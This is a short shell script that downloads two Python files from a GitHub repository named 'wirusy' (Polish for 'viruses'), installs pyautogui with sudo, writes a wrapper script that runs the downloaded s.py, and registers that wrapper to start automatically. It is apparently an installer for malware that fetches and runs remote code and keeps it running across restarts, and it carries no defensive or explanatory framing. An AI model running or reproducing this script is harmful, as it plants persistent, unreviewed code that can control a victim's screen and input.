wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/s.py'
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
user=$(whoami)
sudo pip3 install pyautogui
echo "user=$(whoami) && python3 /home/$user/s.py" > s.sh
chmod +x s.sh
python3 /home/$user/addautostart.py '?' './home/$user/s.sh'
